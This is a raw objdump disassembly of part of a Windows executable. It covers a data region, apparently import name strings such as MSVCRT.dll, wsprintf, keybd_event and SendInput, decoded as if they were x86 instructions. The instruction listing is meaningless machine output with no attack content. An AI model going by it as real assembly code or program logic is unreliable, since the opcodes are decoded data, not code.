  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
